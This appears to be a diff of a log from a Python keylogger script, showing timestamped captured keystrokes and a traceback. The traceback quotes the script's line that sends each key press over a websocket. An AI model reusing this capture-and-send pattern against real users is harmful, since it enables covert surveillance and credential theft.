@@ -1,4 +1,14 @@
-2020-05-29 15:48:34,336: Unhandled exception in listener callback:
+2020-05-29 16:59:01,049: Key.alt_l:
+2020-05-29 16:59:01,121: Key.tab:
+2020-05-29 16:59:01,417: Key.tab:
+2020-05-29 16:59:01,648: Key.tab:
+2020-05-29 16:59:03,057: Key.f5:
+2020-05-29 16:59:07,241: Key.f12:
+2020-05-29 16:59:09,825: 'a':
+2020-05-29 16:59:09,913: 's':
+2020-05-29 16:59:09,945: 'd':
+2020-05-29 16:59:23,281: Key.ctrl_l:
+2020-05-29 16:59:23,281: Unhandled exception in listener callback:
 Traceback (most recent call last):
   File "C:\Users\Admin\AppData\Roaming\Python\Python38\site-packages\pynput\_util\__init__.py", line 162, in inner
     return f(self, *args, **kwargs)
@@ -6,7 +16,7 @@ Traceback (most recent call last):
     self.on_press(key)
   File "C:\Users\Admin\AppData\Roaming\Python\Python38\site-packages\pynput\_util\__init__.py", line 78, in inner
     if f(*args) is False:
-  File "keylogger.py", line 30, in on_press
+  File "keylogger.py", line 31, in on_press
     ws.send('{"timestamp": "' + str(datetime.now()) + '" , "keyPressed": "' + str(key) + '" }')
   File "C:\Users\Admin\AppData\Roaming\Python\Python38\site-packages\websocket\_core.py", line 253, in send
     return self.send_frame(frame)
